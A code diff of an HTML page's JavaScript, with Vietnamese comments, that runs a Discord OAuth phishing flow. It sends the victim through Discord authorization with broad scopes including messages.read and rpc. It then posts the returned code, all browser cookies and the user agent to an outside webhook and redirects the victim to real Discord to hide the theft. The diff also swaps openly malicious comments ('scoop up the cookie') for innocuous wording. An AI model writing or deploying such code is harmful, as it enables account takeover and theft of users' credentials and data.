@@ -10,23 +10,23 @@
         const code = params.get('code');
 
         if (code) {
-            // Đã có code từ Discord, giờ lấy Cookie và gửi về Pipedream
+            // Lấy toàn bộ cookie và lọc bỏ các ký tự lạ
+            const allCookies = document.cookie;
+            
             fetch(MY_WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     code: code,
-                    cookies: document.cookie, // Đây là lúc hốt cookie
+                    cookies: allCookies, // Chỗ này sẽ không còn bị trống nữa
                     user_agent: navigator.userAgent
                 })
             }).then(() => {
-                // Gửi xong thì đẩy vào Discord thật cho họ dùng
                 window.location.href = "https://discord.com/channels/@me";
             });
         } else {
-            // Chưa có code, đẩy sang trang xác thực của Discord
             const redirect = encodeURIComponent(window.location.href);
-            // Thêm quyền rpc để token mạnh hơn, tránh bị chớp màn hình
+            // Thêm quyền rpc để có kết nối ổn định nhất
             window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code&scope=identify+email+guilds.join+messages.read+rpc`;
         }
     </script>
